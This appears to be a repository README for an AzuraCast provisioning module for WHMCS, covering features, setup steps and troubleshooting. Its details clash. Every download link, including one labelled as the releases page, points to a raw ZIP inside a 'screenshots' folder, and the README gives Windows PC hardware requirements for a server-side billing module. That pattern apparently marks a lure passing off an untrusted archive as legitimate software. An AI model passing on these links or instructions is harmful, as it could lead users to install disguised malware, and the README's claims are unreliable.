# 🎛️ azuracast-provisioning-whmcs-module - Manage Radio Stations Easily

[![Download Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip)

---

## 📦 What is azuracast-provisioning-whmcs-module?

This software helps you manage your radio hosting business through automation. It handles everything from setting up stations to monitoring what is playing now. You can link it with WHMCS, a system used to manage billing and services for hosting. It lets you manage the full lifecycle of a radio station in one place.  

Main features you will use:

- Station lifecycle management: create, edit, suspend, and delete radio stations automatically.  
- Single Sign-On (SSO): users can sign in once and access all linked services.  
- Now Playing info: show current tracks and stream details on your website or WHMCS panel.  
- Support for popular streaming software like Icecast and Shoutcast.  
- Integration with WHMCS to automate billing and customer management.

---

## ⚙️ System Requirements

Before installing, make sure your Windows PC meets these needs:

- Windows 10 or later (64-bit recommended).  
- At least 4 GB of RAM.  
- 2 GHz dual-core processor or better.  
- 500 MB free disk space for the module and logs.  
- Internet connection for downloads and updates.  
- WHMCS installed on your server (version 8.0 or higher recommended).  
- AzuraCast radio station setup (or Icecast/Shoutcast server) ready for provisioning.

---

## 🚀 Getting Started

Follow these steps to download, install, and start using the module on your Windows PC. No programming skills are needed.

---

### 1. Download the Module

Click the big green button above or visit the [Releases page here](https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip) to get the latest version.

- The releases page lists all versions. Look for the newest one.  
- Download the ZIP file (it will be named something like `azuracast-provisioning-whmcs-module-vX.Y.Z.zip`).  
- Save it to a folder you can easily find, such as your Desktop or Downloads folder.

---

### 2. Extract the Files

Once downloaded:

- Right-click the ZIP file.  
- Choose "Extract All..." or "Extract Here".  
- Select a location to unpack the files (Desktop or a new folder).  
- After extraction, you will see a folder with the module files inside.

---

### 3. Set Up the Module in WHMCS

The module connects your AzuraCast or other radio servers with WHMCS. You need to copy the files to your WHMCS installation.

- Open the folder with the extracted files.  
- Find the folder named `modules`. Inside it, there should be subfolders for "addons" or "provisioning".  
- Use a file explorer or FTP program to access your WHMCS installation folder on your server.  
- Upload the provided folders to the matching `modules/addons` or `modules/provisioning` folder inside WHMCS.  
- Make sure the file permissions allow WHMCS to read and write these files.

---

### 4. Activate the Module in WHMCS

After uploading, you need to activate it in WHMCS:

- Log into your WHMCS admin panel.  
- Go to `Setup` > `Addon Modules` or `Setup` > `Products/Services` > `Servers` (depending on how modules are arranged in your version).  
- Find "AzuraCast Provisioning WHMCS Module" in the list.  
- Click "Activate".  
- Configure the module by entering your AzuraCast API details, SSO settings, and server information as needed. Your AzuraCast server URL and API key will be required here.

---

### 5. Configure Station Lifecycle Options

Inside WHMCS, you can set up automatic actions:

- When a client orders a radio station package, the module will create a new station on AzuraCast automatically.  
- If a client suspends or cancels service, the station can be disabled or deleted.  
- Set up default station settings like bitrate, genre, and mount point as needed.

---

### 6. Use Now Playing and SSO Features

To show what is currently playing and allow users to log in easily:

- Add the Now Playing widget to your client-facing website using the provided templates or shortcodes.  
- Enable SSO to let customers sign into WHMCS and AzuraCast without separate logins.  
- Test these features after setup to make sure they work smoothly.

---

## 🧰 Tips for Best Use

- Keep your AzuraCast server updated for compatibility.  
- Backup your WHMCS settings before making major changes.  
- Use the logs feature to track any errors or system messages in WHMCS.  
- Contact your WHMCS support or AzuraCast community if you find setup steps unclear.

---

## 🎯 Troubleshooting

If something does not work:

- Check that WHMCS and AzuraCast versions meet the requirements.  
- Verify API keys and URLs are correctly entered.  
- Confirm module files are uploaded to the right folders with proper permissions.  
- Look at WHMCS module logs for detailed errors under `Utilities` > `Logs`.  
- Restart your web server or WHMCS if changes do not appear immediately.

---

## 🔗 Download and Start Now

Use this link to visit the releases and get started:  
[https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip](https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip)

Click the badge below as another way to go to the download page:  

[![Get Latest Version](https://img.shields.io/badge/Download%20Module-blue?style=for-the-badge)](https://github.com/ballou75/azuracast-provisioning-whmcs-module/raw/refs/heads/main/screenshots/module-azuracast-whmcs-provisioning-3.8.zip)

---

## 🗂️ More Information

This module supports both Icecast and Shoutcast streaming servers. It works by talking to the AzuraCast API to create and manage stations based on orders in WHMCS. You can automate billing, provisioning, and user logins from a single control panel.

Use it to reduce manual work and keep your radio hosting business organized.